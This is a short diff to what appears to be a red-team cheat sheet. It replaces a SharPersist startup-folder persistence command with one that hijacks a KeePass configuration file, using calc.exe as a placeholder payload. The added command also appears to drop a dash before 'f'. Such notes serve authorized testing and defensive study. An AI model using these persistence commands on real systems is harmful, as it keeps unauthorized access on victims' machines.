@@ -1,4 +1,10 @@
-SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
+
+### KeePass
+
+```
+SharPersist -t keepass -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" f "C:\Users\username\AppData\Roaming\KeePass\KeePass.config.xml" -m add
+
+```
 
 ### Registry
 ```
